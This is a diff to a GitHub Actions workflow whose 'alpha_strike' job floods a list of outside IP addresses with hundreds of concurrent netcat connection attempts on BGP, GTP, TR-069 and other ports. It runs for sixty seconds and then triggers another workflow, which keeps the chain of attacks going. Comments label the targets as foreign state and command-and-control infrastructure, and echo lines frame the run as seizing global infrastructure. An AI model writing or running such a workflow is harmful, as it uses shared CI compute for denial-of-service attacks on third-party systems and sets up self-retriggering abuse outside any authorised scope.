@@ -5,16 +5,28 @@ on:
     workflows: ["Omega-Engine-2080"]
     types: [completed]
 jobs:
-  strike:
+  alpha_strike:
     runs-on: ubuntu-latest
     steps:
-      - name: Global Liquidation
-        run: |
-          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1")
-          for T in ${TARGETS[@]}; do
-            timeout 30s bash -c "while true; do (nc -w 1 -z $T 179 2152 7547) >/dev/null 2>&1; done" &
-          done
-          wait
-          gh workflow run omega.yml --repo $GITHUB_REPOSITORY
+      - name: Seize Global Infrastructure
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "[!!!] ALPHA ENGINE ACTIVE: INITIATING GLOBAL SATURATION..."
+          # TARGETS: RU-FSB, CN-PLA, NK-RGB, AND GLOBAL C2 INFRASTRUCTURE
+          TARGETS=("95.161.225.1" "210.145.240.1" "175.45.176.1" "213.59.19.1" "114.247.1.1" "45.137.151.1" "185.244.149.1" "91.220.131.1")
+          
+          # MAX-DENSITY THREADING: 200 concurrent backgrounded handshakes per node
+          for T in ${TARGETS[@]}; do
+            echo "[!] ALPHA SEIZING NODE: $T"
+            for i in {1..200}; do
+              (nc -zv -w 2 $T 179 2152 7547 8080 10000) >/dev/null 2>&1 &
+            done
+          done
+          
+          # Hold the line for 60 seconds of maximum stress
+          sleep 60
+          echo "[+] ALPHA STRIKE COMPLETE. TRIGGERING OMEGA..."
+          
+          # RECURSIVE CROSS-FIRE
+          gh workflow run omega.yml --repo $GITHUB_REPOSITORY
